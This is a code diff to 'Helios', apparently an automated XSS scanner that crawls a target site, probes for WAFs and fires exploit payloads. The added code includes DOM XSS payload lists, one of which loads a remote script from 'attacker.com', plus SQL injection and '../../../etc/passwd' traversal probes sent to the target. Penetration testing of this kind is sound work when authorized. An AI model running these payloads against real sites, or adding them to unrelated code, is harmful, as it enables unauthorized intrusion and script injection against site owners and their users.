@@ -298,7 +298,7 @@ class XSSScanner:
     def print_rps_continuously(self):
         while self.rps_monitor_running:
             total_requests = len(self.request_times)
-            sys.stdout.write(f"\r\033[K[{bcolors.PURPLE}RPS: {self.current_rps} | Total Requests: {total_requests}]{bcolors.ENDC}")
+            sys.stdout.write(f"\r\033{bcolors.BOLD}[{bcolors.ENDC}{bcolors.PURPLE}RPS: {self.current_rps} | Total Requests: {total_requests}{bcolors.ENDC}{bcolors.BOLD}]")
             sys.stdout.flush()
             time.sleep(0.5)  # Update display every 500ms
 
@@ -533,72 +533,6 @@ class XSSScanner:
                     await self.test_dom_xss(tag[attr])
         return results
 
-    async def test_dom_xss(self, content, is_external=False, script_url=None):
-        if is_external and script_url:
-            self.print_and_save(f"[*] Analyzing external script: {script_url}")
-            content = await self.fetch_external_script(script_url)
-            if not content:
-                return False
-
-        sources = [
-            "document.URL", "document.documentURI", "document.URLUnencoded", "document.baseURI",
-            "location", "document.cookie", "document.referrer", "window.name",
-            "history.pushState", "history.replaceState", "localStorage", "sessionStorage",
-            "IndexedDB", "WebSQL", "FileSystem"
-        ]
-        sinks = [
-            "eval", "setTimeout", "setInterval", "setImmediate", "execScript",
-            "crypto.generateCRMFRequest", "ScriptElement.src", "ScriptElement.text",
-            "ScriptElement.textContent", "ScriptElement.innerText",
-            "anyTag.onEventName", "range.createContextualFragment",
-            "crypto.generateCRMFRequest", "HTMLElement.innerHTML",
-            "Document.write", "Document.writeln"
-        ]
-
-        for source in sources:
-            for sink in sinks:
-                pattern = re.compile(r'{}.*?{}'.format(re.escape(source), re.escape(sink)), re.IGNORECASE | re.DOTALL)
-                if pattern.search(content):
-                    location = "an external script" if is_external else "an inline script"
-                    self.print_and_save(f"[+] Potential DOM XSS found in {location}: {bcolors.OKGREEN}{source} flowing into {sink}", important=True)
-                    if is_external:
-                        self.print_and_save(f"Script URL: {script_url}")
-                    
-                    exploit_info = await self.confirm_dom_xss(source, sink, is_external, script_url)
-                    if exploit_info:
-                        self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {bcolors.OKGREEN}{source} {bcolors.ENDC}into {bcolors.OKGREEN}{sink}{bcolors.ENDC}", important=True)
-                        self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
-                        return True
-                    else:
-                        self.print_and_save(f"[*] Could not confirm DOM XSS for {source} into {sink}. Manual verification recommended.", important=True)
-
-        vulnerable_patterns = [
-            (r'document\.write\s*\(\s*.*\)', "document.write"),
-            (r'\.innerHTML\s*=\s*.*', "innerHTML"),
-            (r'\.outerHTML\s*=\s*.*', "outerHTML"),
-            (r'\.insertAdjacentHTML\s*\(.*\)', "insertAdjacentHTML"),
-            (r'execScript\s*\(.*\)', "execScript"),
-            (r'setTimeout\s*\(.*\)', "setTimeout"),
-            (r'setInterval\s*\(.*\)', "setInterval"),
-        ]
-
-        for pattern, func_name in vulnerable_patterns:
-            if re.search(pattern, content, re.IGNORECASE):
-                location = "an external script" if is_external else "an inline script"
-                self.print_and_save(f"[+] Potential DOM XSS vulnerability found in {location}: {bcolors.OKGREEN}{func_name}{bcolors.ENDC}", important=True)
-                if is_external:
-                    self.print_and_save(f"Script URL: {script_url}")
-                
-                exploit_info = await self.confirm_dom_xss(func_name, func_name, is_external, script_url)
-                if exploit_info:
-                    self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {func_name}", important=True)
-                    self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
-                    return True
-                else:
-                    self.print_and_save(f"[*] Could not confirm DOM XSS for {func_name}. Manual verification recommended.", important=True)
-
-        return False
-
     async def fetch_external_script(self, url):
         try:
             async with self.session.get(url) as response:
@@ -737,7 +671,7 @@ class XSSScanner:
 
         return False
 
-    def exploit_cookie_to_settimeout(self, source, sink):
+    async def exploit_cookie_to_settimeout(self, source, sink):
         payloads = [
             f"document.cookie='xss=1;expires=Thu, 18 Dec 2023 12:00:00 UTC;path=/';setTimeout('alert(\"{self.canary_string}\")',100);",
             f"document.cookie='xss=1;expires=Thu, 18 Dec 2023 12:00:00 UTC;path=/';setTimeout(function(){{alert('{self.canary_string}')}},100);",
@@ -748,12 +682,12 @@ class XSSScanner:
             test_url = f"{self.target_url}#" + urllib.parse.quote(payload)
             self.print_and_save(f"[*] Testing DOM XSS (cookie to setTimeout) URL: {test_url}", important=True)
             
-            if self.test_single_payload(test_url, payload):
+            if await self.test_single_payload(test_url, payload):
                 return {'payload': payload, 'url': test_url}
         
         return None
 
-    def exploit_location_to_eval(self, source, sink):
+    async def exploit_location_to_eval(self, source, sink):
         payloads = [
             f"javascript:eval('alert(\"{self.canary_string}\")')",
             f"javascript:eval(atob('YWxlcnQoInt7self.canary_string}}Iik='))",  # Base64 encoded payload
@@ -764,12 +698,12 @@ class XSSScanner:
             test_url = f"{self.target_url}#" + urllib.parse.quote(payload)
             self.print_and_save(f"[*] Testing DOM XSS (location to eval) URL: {test_url}", important=True)
             
-            if self.test_single_payload(test_url, payload):
+            if await self.test_single_payload(test_url, payload):
                 return {'payload': payload, 'url': test_url}
         
         return None
 
-    def exploit_innerhtml(self, source, sink):
+    async def exploit_innerhtml(self, source, sink):
         payloads = [
             f"<img src=x onerror=alert('{self.canary_string}')>",
             f"<svg><script>alert('{self.canary_string}')</script></svg>",
@@ -780,7 +714,7 @@ class XSSScanner:
             test_url = f"{self.target_url}#" + urllib.parse.quote(payload)
             self.print_and_save(f"[*] Testing DOM XSS (innerHTML) URL: {test_url}", important=True)
             
-            if self.test_single_payload(test_url, payload):
+            if await self.test_single_payload(test_url, payload):
                 return {'payload': payload, 'url': test_url}
         
         return None
@@ -790,58 +724,90 @@ class XSSScanner:
             ('document.cookie', 'setTimeout'): self.exploit_cookie_to_settimeout,
             ('location', 'eval'): self.exploit_location_to_eval,
             ('innerHTML', 'innerHTML'): self.exploit_innerhtml,
-            # todo: add more source-sink pairs here
+            # Add more source-sink pairs here
         }
 
+        exploit_info = None
         exploit_method = exploitation_strategies.get((source, sink))
+        
         if exploit_method:
+            self.print_and_save(f"[*] Attempting specific exploit for source '{source}' and sink '{sink}'.", important=True)
             exploit_info = await exploit_method(source, sink)
-        else:
-            self.print_and_save(f"[!] Exploit payload not implemented for source '{source}' and sink '{sink}'. Using general DOM XSS exploit method.", important=True)
+
+        if not exploit_info:
+            self.print_and_save(f"[*] Specific exploit not successful or not available. Trying general DOM XSS exploit method.", important=True)
             exploit_info = await self.general_dom_xss_exploit(source, sink)
         
         if exploit_info:
-            return self.generate_exploit_info(source, sink, exploit_info['payload'], exploit_info['url'], is_external, script_url)
+            vuln_info = self.generate_exploit_info(source, sink, exploit_info['payload'], exploit_info['url'], is_external, script_url)
+            
+            # Add the vulnerability to self.vulnerabilities_found
+            self.vulnerabilities_found.append({
+                'type': 'DOM XSS',
+                'method': 'GET',  # DOM XSS is typically exploited via GET
+                'url': exploit_info['url'],
+                'payload': exploit_info['payload'],
+                'parameter': 'N/A',  # DOM XSS doesn't always have a specific parameter
+                'details': vuln_info
+            })
+            
+            self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {source} into {sink}", important=True)
+            self.print_and_save(f"[*] Exploit Information:\n{vuln_info}", important=True)
+            return vuln_info
         else:
             self.print_and_save(f"[!] Could not generate exploit for source '{source}' and sink '{sink}'.", important=True)
         
         return None
 
-    def general_dom_xss_exploit(self, source, sink):
-        # Fallback method for unknown source-sink pairs
+    async def general_dom_xss_exploit(self, source, sink):
+        payloads = [
+            f"<img src=x onerror=alert('{self.canary_string}')>",
+            f"javascript:alert('{self.canary_string}')",
+            f"'><script>alert('{self.canary_string}')</script>",
+            f"'-alert('{self.canary_string}')-'",
+            f"\\'-alert('{self.canary_string}')-\\'",
+            f"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://attacker.com/xss.js\\';document.body.appendChild(a)')",
+            f"data:text/html;base64,PHNjcmlwdD5hbGVydCgne3NlbGYuY2FuYXJ5X3N0cmluZ319Jyk8L3NjcmlwdD4="
+        ]
+
         parsed_url = urllib.parse.urlparse(self.target_url)
-        query = parsed_url.query
-        
-        if '=' not in query and query:
-            original_param = query
-            existing_params = {}
-        else:
-            existing_params = urllib.parse.parse_qs(query)
-            original_param = None
-        
-        for payload in self.payloads:
+        query_params = urllib.parse.parse_qs(parsed_url.query)
+
+        for payload in payloads:
             encoded_payload = urllib.parse.quote(payload)
-            
-            if original_param:
-                test_query = f"{original_param}{encoded_payload}"
-                test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
-                
-                self.print_and_save(f"[*] Testing general DOM XSS URL: {test_url}", important=True)
-                
-                if self.test_single_payload(test_url, payload):
-                    return {'payload': payload, 'url': test_url}
-            
-            for param in existing_params:
-                test_params = existing_params.copy()
+
+            # Test adding the payload to existing parameters
+            for param in query_params:
+                test_params = query_params.copy()
                 test_params[param] = [f"{test_params[param][0]}{encoded_payload}"]
                 test_query = urllib.parse.urlencode(test_params, doseq=True)
                 test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
                 
-                self.print_and_save(f"[*] Testing general DOM XSS URL: {test_url}", important=True)
+                self.print_and_save(f"[*] Testing DOM XSS URL: {test_url}", important=True)
                 
-                if self.test_single_payload(test_url, payload):
+                if await self.test_single_payload(test_url, payload):
                     return {'payload': payload, 'url': test_url}
-        
+
+            # Test adding a new parameter with the payload
+            new_param = f"xss_test_{random.randint(1000, 9999)}"
+            test_params = query_params.copy()
+            test_params[new_param] = [encoded_payload]
+            test_query = urllib.parse.urlencode(test_params, doseq=True)
+            test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
+            
+            self.print_and_save(f"[*] Testing DOM XSS URL with new parameter: {test_url}", important=True)
+            
+            if await self.test_single_payload(test_url, payload):
+                return {'payload': payload, 'url': test_url}
+
+            # Test adding the payload to the fragment identifier
+            test_url = urllib.parse.urlunparse(parsed_url._replace(fragment=encoded_payload))
+            
+            self.print_and_save(f"[*] Testing DOM XSS URL with fragment: {test_url}", important=True)
+            
+            if await self.test_single_payload(test_url, payload):
+                return {'payload': payload, 'url': test_url}
+
         return None
     
     async def test_single_payload(self, test_url, payload):
@@ -880,12 +846,7 @@ class XSSScanner:
                     self.print_and_save("[!] Please install the required browser and try again.", important=True)
                     return
                 
-                detected_wafs = await self.detect_waf()
-                if detected_wafs:
-                    self.print_and_save(f"[!] WAF detected: {', '.join(detected_wafs)}", important=True)
-                    self.print_and_save("[!] WAF presence may affect scan results or require evasion techniques.", important=True)
-                else:
-                    self.print_and_save("[*] No WAF detected.")
+                await self.detect_waf()
 
                 # Initialize URL queue
                 self.url_queue = asyncio.Queue()
@@ -927,19 +888,23 @@ class XSSScanner:
         
         finally:
             # Add detailed summary of findings
-            self.print_and_save("\n[*] Scan Summary:", important=True)
             if self.vulnerabilities_found:
+                self.print_and_save("\n[*] Scan Summary:", important=True)
                 for vuln in self.vulnerabilities_found:
                     self.print_and_save(f"[+] {vuln['type']} vulnerability detected:", important=True)
                     self.print_and_save(f"    Method: {vuln['method']}", important=True)
                     self.print_and_save(f"    URL: {vuln['url']}", important=True)
                     self.print_and_save(f"    Parameter: {vuln['parameter']}", important=True)
                     self.print_and_save(f"    Payload: {vuln['payload']}", important=True)
-                    self.print_and_save("", important=True)  # Empty line for readability
+                    if 'details' in vuln:
+                        self.print_and_save(f"    Details: {vuln['details']}", important=True)
+                    # self.print_and_save("", important=True)  # Empty line for readability
             else:
                 self.print_and_save("[*] No vulnerabilities were found during the scan.", important=True)
             
-            self.print_and_save(f"\n{bcolors.WARNING}[!]{bcolors.ENDC} Helios has concluded testing {self.target_url}.", important=True)
+            print(f"\n{bcolors.PURPLE}Scan finished in {time.time() - start_time:.2f} seconds{bcolors.ENDC}")
+            
+            self.print_and_save(f"{bcolors.WARNING}[!]{bcolors.ENDC} Helios has concluded testing {self.target_url}.", important=True)
 
             # Final cleanup
             sys.stdout.write('\r\033[K')  # Clear the last line (RPS counter)
@@ -975,22 +940,67 @@ class XSSScanner:
             'Barracuda': ['barra_counter_session'],
             'Citrix NetScaler': ['ns_af=', 'citrix_ns_id'],
             'Amazon WAF': ['x-amz-cf-id', 'x-amzn-RequestId'],
-            'Wordfence': ['wordfence_verifiedHuman']
+            'Wordfence': ['wordfence_verifiedHuman'],
+            'Fortinet FortiWeb': ['FORTIWAFSID='],
+            'Imperva': ['X-Iinfo', '_pk_id'],
+            'Varnish': ['X-Varnish'],
+            'StackPath': ['X-SP-GATEWAY'],
+            'Fastly': ['Fastly-SSL']
         }
 
+        detected_wafs = set()
+
+        # Standard header check
         async with self.session.get(self.target_url) as response:
             headers = response.headers
             cookies = response.cookies
 
-        detected_wafs = []
+            for waf, signatures in waf_signatures.items():
+                for signature in signatures:
+                    if signature.lower() in [header.lower() for header in headers] or signature in cookies:
+                        detected_wafs.add(waf)
+                        break
 
-        for waf, signatures in waf_signatures.items():
-            for signature in signatures:
-                if signature.lower() in [header.lower() for header in headers] or signature in cookies:
-                    detected_wafs.append(waf)
-                    break
+        # Behavioral checks
+        payloads = [
+            "<script>alert('XSS')</script>",
+            "' OR '1'='1",
+            "../../../etc/passwd",
+            "/?param=<script>alert('XSS')</script>"
+        ]
 
-        return detected_wafs
+        for payload in payloads:
+            try:
+                async with self.session.get(f"{self.target_url}{payload}", allow_redirects=False) as response:
+                    if response.status in [403, 406, 429, 503]:
+                        detected_wafs.add("Unknown WAF (based on behavior)")
+                        break
+                    
+                    text = await response.text()
+                    if any(keyword in text.lower() for keyword in ['waf', 'firewall', 'malicious', 'blocked', 'security']):
+                        detected_wafs.add("Generic WAF detected")
+                        break
+            except Exception as e:
+                self.print_and_save(f"[!] Error during WAF behavioral check: {str(e)}", important=True)
+
+        # Check for specific WAF responses
+        try:
+            async with self.session.get(f"{self.target_url}/?_test_waf=1", allow_redirects=False) as response:
+                text = await response.text()
+                if "blocked" in text.lower() or "firewall" in text.lower():
+                    detected_wafs.add("Generic WAF detected")
+        except Exception as e:
+            self.print_and_save(f"[!] Error during WAF specific response check: {str(e)}", important=True)
+
+        # Report results
+        if detected_wafs:
+            self.print_and_save(f"[!] WAF(s) detected: {', '.join(detected_wafs)}", important=True)
+            self.print_and_save("[!] WAF presence may affect scan results or require evasion techniques.", important=True)
+        else:
+            self.print_and_save("[*] No WAF detected.")
+        
+        self.detected_wafs = list(detected_wafs)
+        return self.detected_wafs
 
     def async_handle_alerts(func):
         @wraps(func)
@@ -1178,7 +1188,7 @@ class XSSScanner:
                     'payload': original_payload,
                     'parameter': next(iter(data)) if data else 'N/A'
                 }
-                self.print_and_save(f"[!] Possible SQL injection vulnerability detected with payload: {bcolors.WARNING}{original_payload}{bcolors.ENDC}", important=True)
+                self.print_and_save(f"[!] Possible {bcolors.BOLD}{bcolors.fail}SQL injection{bcolors.ENDC} vulnerability detected with payload: {bcolors.WARNING}{original_payload}{bcolors.ENDC}", important=True)
                 self.print_and_save(f"[!] SQL Injection details: {', '.join(result['details'])}", important=True)
                 self.vulnerabilities_found.append(vuln_info)
 
@@ -1267,7 +1277,7 @@ class XSSScanner:
                     result['details'].append(f"Alert detected: {alert_text}")
                     alert.accept()
             except TimeoutException:
-                pass  # No alert present, continue with other checks
+                pass  # No alert present
 
             # Get page source
             try:
@@ -1432,38 +1442,23 @@ class XSSScanner:
             if soup is None:
                 return
             
-            for link in soup.find_all('a', href=True):
-                next_url = urllib.parse.urljoin(url, link['href'])
+            links = [urllib.parse.urljoin(url, link['href']) for link in soup.find_all('a', href=True)]
+            valid_links = []
+            
+            for next_url in links:
                 parsed_next_url = urllib.parse.urlparse(next_url)
                 parsed_target_url = urllib.parse.urlparse(self.target_url)
                 
                 if (parsed_next_url.netloc == parsed_target_url.netloc and 
-                    parsed_next_url.scheme == parsed_target_url.scheme):
-                    await self.crawl_website(next_url, depth - 1)
+                    parsed_next_url.scheme == parsed_target_url.scheme and
+                    next_url not in self.discovered_urls):
+                    valid_links.append(next_url)
+                    self.discovered_urls.add(next_url)
+
+            await asyncio.gather(*[self.crawl_website(next_url, depth - 1) for next_url in valid_links])
+
         except Exception as e:
             self.print_and_save(f"[!] Error crawling {url}: {str(e)}", important=True)
-
-            self.scanned_urls.add(url)
-            self.discovered_urls.add(url)
-            self.print_and_save(f"[*] Crawling: {url}", important=True)
-
-            try:
-                async with self.session.get(url) as response:
-                    text = await response.text()
-                soup = BeautifulSoup(text, 'html.parser')
-                if soup is None:
-                    return
-                
-                for link in soup.find_all('a', href=True):
-                    next_url = urllib.parse.urljoin(url, link['href'])
-                    parsed_next_url = urllib.parse.urlparse(next_url)
-                    parsed_target_url = urllib.parse.urlparse(self.target_url)
-                    
-                    if (parsed_next_url.netloc == parsed_target_url.netloc and 
-                        parsed_next_url.scheme == parsed_target_url.scheme):
-                        await self.crawl_website(next_url, depth - 1)
-            except Exception as e:
-                self.print_and_save(f"[!] Error crawling {url}: {str(e)}", important=True)
 
 async def async_main():
     parser = argparse.ArgumentParser(description="Helios - Automated XSS Scanner")
@@ -1523,8 +1518,8 @@ async def async_main():
     except KeyboardInterrupt:
         print("\nKeyboard interrupt received. Exiting...")
     finally:
-        if scanner:
-            await scanner.cleanup()
+        # if scanner:
+            # await scanner.cleanup()
         # Ensure all resources are properly closed
         tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
         for task in tasks:
